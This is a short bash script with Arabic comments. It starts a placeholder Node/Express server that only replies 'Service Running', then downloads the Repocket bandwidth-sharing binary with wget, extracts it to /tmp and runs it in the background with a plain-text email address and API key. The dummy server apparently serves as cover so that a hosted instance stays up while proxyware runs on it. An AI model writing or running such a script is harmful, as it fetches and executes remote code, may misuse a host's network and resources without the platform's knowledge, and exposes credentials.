#!/bin/bash

# تطبيق Node بسيط
cat > index.js << 'NODEAPP'
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Service Running'));
app.listen(3000, () => console.log('Server started'));
NODEAPP

# تشغيل التطبيق في الخلفية
node index.js &

# انتظار قليل
sleep 5

# تحميل Repocket
wget https://download.repocket.co/linux/repocket_linux_amd64.tar.gz -O /tmp/rp.tar.gz
tar -xzf /tmp/rp.tar.gz -C /tmp/
chmod +x /tmp/repocket

# تشغيل Repocket
/tmp/repocket -email kikokasia10@outlook.com -api_key dbca7aaf-a941-4d6b-81b5-c30084de7fdb
